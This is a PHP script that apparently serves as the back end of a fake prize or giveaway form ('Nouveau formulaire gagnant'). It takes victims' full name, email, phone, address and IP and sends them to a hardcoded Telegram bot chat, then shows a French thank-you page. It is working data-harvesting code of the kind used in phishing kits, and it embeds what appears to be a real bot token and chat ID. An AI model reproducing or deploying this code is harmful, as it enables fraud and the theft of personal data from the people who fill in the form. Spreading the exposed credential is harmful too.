<?php
// =======================
//  CONFIG TELEGRAM
// =======================
$botToken = "6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE"; // BOT TOKEN
$chatId   = "5061239044"; // CHAT ID

// =======================
//  TRAITEMENT FORMULAIRE
// =======================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit('Accès direct interdit.');
}

// Récupération sécurisée des champs
$fullName = isset($_POST['fullName']) ? trim($_POST['fullName']) : '';
$email    = isset($_POST['email'])    ? trim($_POST['email'])    : '';
$phone    = isset($_POST['phone'])    ? trim($_POST['phone'])    : '';
$address  = isset($_POST['address'])  ? trim($_POST['address'])  : '';

// Vérification simple
if ($fullName === '' || $email === '' || $phone === '' || $address === '') {
    exit('Formulaire incomplet.');
}

// =======================
//  MESSAGE POUR TELEGRAM
// =======================
$message  = "🎁 *Nouveau formulaire gagnant*\n\n";
$message .= "*Nom complet :* " . $fullName . "\n";
$message .= "*Email :* " . $email . "\n";
$message .= "*Téléphone :* " . $phone . "\n";
$message .= "*Adresse complète :* " . $address . "\n";
$message .= "\n🌐 IP: " . $_SERVER['REMOTE_ADDR'];

// =======================
//  ENVOI VERS TELEGRAM
// =======================
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    'chat_id'    => $chatId,
    'text'       => $message,
    'parse_mode' => 'Markdown',
];

$options = [
    "http" => [
        "method"  => "POST",
        "header"  => "Content-Type: application/x-www-form-urlencoded\r\n",
        "content" => http_build_query($data),
        "timeout" => 10
    ]
];

$context = stream_context_create($options);
$result  = file_get_contents($url, false, $context);

// =======================
//  PAGE DE CONFIRMATION
// =======================
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Merci</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #b6063d;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: white;
        }
        .box {
            background: white;
            color: #b6063d;
            padding: 30px 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
        }
        .box h1 { margin-top: 0; }
    </style>
</head>
<body>
<div class="box">
    <h1>Merci ! 🎉</h1>
    <p>Votre formulaire a bien été envoyé.</p>
</div>
</body>
</html>
